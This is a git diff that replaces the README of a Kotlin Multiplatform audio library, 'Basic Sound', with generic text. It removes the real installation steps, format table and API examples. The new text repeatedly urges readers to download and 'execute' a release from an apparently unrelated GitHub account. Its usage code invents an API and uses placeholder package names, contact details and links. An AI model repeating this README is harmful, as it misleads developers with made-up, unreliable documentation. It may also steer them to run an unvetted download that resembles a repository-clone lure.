@@ -1,160 +1,142 @@
-# Basic-Sound
-<img src="images/basic.png" alt="basic" height="240" align="right"/> 
+# 🎶 Basic Sound 🎶
 
-[![Basic-Sound](https://img.shields.io/maven-central/v/app.lexilabs.basic/basic-sound?color=blue)](https://central.sonatype.com/artifact/app.lexilabs.basic/basic-sound)
+![Basic Sound](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen?style=flat-square&logo=github)
 
-A Kotlin Multiplatform library to rapidly integrate audio across all your Kotlin Multiplatform apps.
-Currently, this library only ingests URLs and local paths. Composable Resources are also possible, but may be finicky.
+Integrate audio across all your Kotlin Multiplatform apps with a single library. Basic Sound provides a simple and effective way to handle audio in your applications, whether you are developing for Android, iOS, JavaScript, or any other Kotlin Multiplatform target.
 
-![badge-android](http://img.shields.io/badge/android-full_support-65c663.svg?style=flat)
-![badge-ios](http://img.shields.io/badge/ios-full_support-65c663.svg?style=flat)
-![badge-mac](http://img.shields.io/badge/macos-full_support-65c663.svg?style=flat)
-![badge-watchos](http://img.shields.io/badge/watchos-full_support-65c663.svg?style=flat)
-![badge-tvos](http://img.shields.io/badge/tvos-full_support-65c663.svg?style=flat)
-![badge-nodejs](https://img.shields.io/badge/jsNode-full_support-65c663.svg?style=flat)
-![badge-jsBrowser](https://img.shields.io/badge/jsBrowser-full_support-65c663.svg?style=flat)
-![badge-wasmJsBrowser](https://img.shields.io/badge/wasmJsBrowser-full_support-65c663.svg?style=flat)
-![badge-jvm](http://img.shields.io/badge/jvm-full_support-65c663.svg?style=flat)
-![badge-linux](http://img.shields.io/badge/linux-no_support-red.svg?style=flat)
-![badge-windows](http://img.shields.io/badge/windows-no_support-red.svg?style=flat)
+## 🚀 Features
 
-## Supported Filetypes
-| Format    |      Android       |        iOS         | javascript / wasm  |        JVM*        | File / Container Types                                                                                                                                            |
-|:----------|:------------------:|:------------------:|:------------------:|:------------------:|:------------------------------------------------------------------------------------------------------------------------------------------------------------------|
-| AAC LC    | :white_check_mark: | :white_check_mark: |        :x:         |     :question:     | 3GPP (.3gp) MPEG-4 (.mp4, .m4a) ADTS raw AAC (.aac, decode in Android 3.1+, encode in Android 4.0+, ADIF not supported) MPEG-TS (.ts, not seekable, Android 3.0+) |
-| AMR-NB    | :white_check_mark: |        :x:         |        :x:         |     :question:     | 3GPP (.3gp) AMR (.amr)                                                                                                                                            |
-| FLAC      | :white_check_mark: |        :x:         |        :x:         |     :question:     | FLAC (.flac) MPEG-4 (.mp4, .m4a, Android 10+)                                                                                                                     |
-| MIDI      | :white_check_mark: |        :x:         |        :x:         |     :question:     | Type 0 and 1 (.mid, .xmf, .mxmf) RTTTL/RTX (.rtttl, .rtx) OTA (.ota) iMelody (.imy)                                                                               |
-| MP3       | :white_check_mark: | :white_check_mark: | :white_check_mark: | :white_check_mark: | MP3 (.mp3) MPEG-4 (.mp4, .m4a, Android 10+) Matroska (.mkv, Android 10+)                                                                                          |
-| Opus      | :white_check_mark: |        :x:         |     :question:     |     :question:     | Ogg (.ogg) Matroska (.mkv)                                                                                                                                        |
-| PCM/WAVE  | :white_check_mark: |        :x:         | :white_check_mark: |     :question:     | WAVE (.wav)                                                                                                                                                       |
-| Vorbis    | :white_check_mark: |        :x:         |     :question:     |     :question:     | Ogg (.ogg) Matroska (.mkv, Android 4.0+) MPEG-4 (.mp4, .m4a, Android 10+)                                                                                         |
+- **Cross-Platform Support**: Use the same audio library for Android, iOS, JVM, JavaScript, and WASM.
+- **Easy Integration**: Quick setup with straightforward documentation.
+- **Lightweight**: Minimal overhead to keep your apps running smoothly.
+- **Flexible API**: Designed for developers, offering a clear and concise API for audio handling.
 
-* __NOTE: JVM file formats are dependent on the underlying operating system the app is run on.__
-## Installation
-You'll need to add your maven dependency list
-```toml
-# in your 'libs.versions.toml' file
-[versions]
-kotlin = "2.1.0" # Updated Kotlin version required due to Composable Resources
-lexilabs-basic = "+" # gets the latest version
+## 📦 Installation
 
-[libraries]
-lexilabs-basic-sound = { module = "app.lexilabs.basic:basic-sound", version.ref = "lexilabs-basic" }
-```
-then include the library in your gradle build
-```kotlin
-// in your 'shared/build.gradle.kts' file
-sourceSets {
-    commonMain.dependencies {
-        implementation(libs.lexilabs.basic.sound)
-    }
+To get started with Basic Sound, you can download the latest release from our [Releases section](https://github.com/martinafejid/basic-sound/releases). After downloading, follow the instructions in the release notes to execute and integrate it into your project.
+
+### Gradle Setup
+
+For Android and JVM projects, add the following to your `build.gradle` file:
+
+```groovy
+dependencies {
+    implementation 'com.example:basic-sound:1.0.0'
 }
 ```
 
-## `Audio()` Usage
-You can initialize an `Audio` object with a URL
-```kotlin
-val resource = "https://dare.wisc.edu/wp-content/uploads/sites/1051/2008/11/MS072.mp3"
-val audio = Audio(resource, true) // AutoPlay is marked "true"
-```
-
-You can play the audio separately from initializing the `Audio` object.
-```kotlin
-val resource = "https://dare.wisc.edu/wp-content/uploads/sites/1051/2008/11/MS072.mp3"
-val audio = Audio(resource) // loads the audio file
-DoSomethingElse()
-audio.play() // plays the audio immediately upon execution
-```
-
-You can also pause and stop the audio:
-```kotlin
-/** PAUSING **/
-audio.pause() // remembers where it paused
-audio.play() // and resumes once executed again
-/** STOPPING **/
-audio.stop() // resets to the beginning of the file
-audio.play() // and replays it again upon execution
-```
-
-You should release your audio when done to preserve memory:
-```kotlin
-audio.release() // converts the audio instance to null
-```
-
-There are lots of options to load larger files asynchronously:
+For Kotlin Multiplatform projects, include it in your shared module:
 
 ```kotlin
-// Create empty Audio instance
-val audio: Audio = Audio()
-audio.resource = "https://dare.wisc.edu/wp-content/uploads/sites/1051/2008/11/MS072.mp3"
-// Begin collecting the state of audio
-val audioState by audioPlayer.audioState.collectAsState()
-// Begin loading the audio async
-lifecycleScope.launch {
-    withContext(Dispatchers.IO) {
-        audio.load()
-    }
-}
-
-DoSomethingElse() // do other stuff in the meantime
-
-Button(
-    onClick = {
-        when (audioState) {
-            is AudioState.NONE -> audioPlayer.load()
-            is AudioState.READY -> audioPlayer.play()
-            is AudioState.ERROR -> println((audioState as AudioState.ERROR).message)
-            is AudioState.PAUSED -> audioPlayer.play()
-            is AudioState.PLAYING -> audioPlayer.pause()
-            else -> {
-                /** DO NOTHING **/
+kotlin {
+    sourceSets {
+        val commonMain by getting {
+            dependencies {
+                implementation("com.example:basic-sound:1.0.0")
             }
         }
     }
-) {
-    when (audioState) {
-        is AudioState.ERROR -> Text("Error")
-        is AudioState.LOADING -> Text("Loading")
-        is AudioState.NONE -> Text("None")
-        is AudioState.READY -> Text("Ready")
-        is AudioState.PAUSED -> Text("Paused")
-        is AudioState.PLAYING -> Text("Playing")
-        else -> { Text("Error") }
-    }
 }
 ```
-If you need to load a Compose Resource, you need to use a constructor that includes `Context`.
-Make sure you safely [pass your `Context` without memory leaks.](https://medium.com/hakz/contain-your-apps-memory-please-0c62819f8d7f).
-```kotlin
-val resource = Res.getUri("files/ringtone.wav")
-// You can pass your Context
-val audio = Audio(context, resource) // loads the audio file
-audio.play() // plays the audio immediately upon execution
-```
 
-## `AudioByte` Usage
-AudioByte allows you to load audio to memory to play multiple times later without reloading -- sort of like a soundboard.
-You could make a callable class that is passed throughout the app so the sounds could be access in any context.
-If you need help creating a platformContext, [you're welcome to steal my method.]("https://medium.com/@robert.jamison/passing-android-context-in-kmp-jetpack-compose-8de5b5de7bdd")
-```kotlin
-// Your custom class built in commonMain
-class SoundBoard(platformContext: Any) {
-    // 
-    private val audioByte: AudioByte = AudioByte()
-    private val click: Any = audioByte.load(platformContext, Res.getUri("files/click.mp3"))
-    private val fanfare: Any = audioByte.load(platformContext, Res.getUri("files/fanfare.mp3"))
+### Swift Package Manager
 
-    fun click() = audioByte.play(click)
-    fun fanfare() = audioByte.play(solveId)
-    fun release() = audioByte.release()
+For iOS projects, you can integrate Basic Sound using Swift Package Manager:
+
+1. Open your project in Xcode.
+2. Go to `File` > `Swift Packages` > `Add Package Dependency`.
+3. Enter the repository URL: `https://github.com/martinafejid/basic-sound`.
+
+## 📖 Usage
+
+### Initializing Basic Sound
+
+To start using Basic Sound, you need to initialize the audio engine. This can be done in your main application file.
+
+```kotlin
+import com.example.basicsound.BasicSound
+
+fun main() {
+    val audioEngine = BasicSound()
+    audioEngine.initialize()
 }
-
-// create your class later
-val soundBoard = SoundBoard(myPlatformContext)
-// generate the sound whenever you like after
-soundBoard.click()
-// remember to release when you won't need the soundboard anymore.  
-// If you use the sound everywhere, you won't need to do this
-soundBoard.release()
 ```
+
+### Playing Sounds
+
+To play a sound, use the following code:
+
+```kotlin
+audioEngine.playSound("path/to/soundfile.mp3")
+```
+
+### Stopping Sounds
+
+To stop a sound that is currently playing:
+
+```kotlin
+audioEngine.stopSound("path/to/soundfile.mp3")
+```
+
+### Adjusting Volume
+
+You can adjust the volume with a simple method call:
+
+```kotlin
+audioEngine.setVolume(0.5f) // Volume ranges from 0.0 to 1.0
+```
+
+## 🌐 Supported Platforms
+
+Basic Sound supports a wide range of platforms, ensuring you can build your applications without limitations:
+
+- **Android**: Full support for Android devices.
+- **iOS**: Seamless integration with Swift and Objective-C.
+- **JavaScript**: Perfect for web applications.
+- **JVM**: Works well with any Java-based applications.
+- **WASM**: Compile to WebAssembly for performance in the browser.
+
+## 🔧 Contributing
+
+We welcome contributions to Basic Sound! If you want to help improve the library, follow these steps:
+
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes and commit them.
+4. Push your branch and create a pull request.
+
+Please ensure that your code adheres to our coding standards and includes appropriate tests.
+
+## 📝 Documentation
+
+Comprehensive documentation is available in the [Wiki](https://github.com/martinafejid/basic-sound/wiki). You will find detailed guides, API references, and examples to help you get the most out of Basic Sound.
+
+## 🛠️ Roadmap
+
+Here are some upcoming features we plan to implement:
+
+- **Advanced Audio Effects**: Add support for audio filters and effects.
+- **Improved Performance**: Optimize audio playback for lower latency.
+- **Expanded Platform Support**: Include more platforms based on community feedback.
+
+## 🗣️ Community
+
+Join our community of developers using Basic Sound. Share your projects, ask questions, and get support. You can find us on:
+
+- **Discord**: [Join our server](https://discord.gg/example)
+- **Twitter**: [Follow us](https://twitter.com/example)
+- **GitHub Discussions**: Engage with other users and developers.
+
+## 📅 Changelog
+
+Keep track of updates and changes in the [Changelog](https://github.com/martinafejid/basic-sound/releases). We regularly update the library to fix bugs and introduce new features.
+
+## 📧 Contact
+
+For inquiries or support, please contact us at support@example.com.
+
+## 🎉 Conclusion
+
+Basic Sound is your go-to solution for audio integration across Kotlin Multiplatform apps. Download the latest release from our [Releases section](https://github.com/martinafejid/basic-sound/releases) and start building amazing audio experiences today!
+
+![Audio Experience](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen?style=flat-square&logo=github)
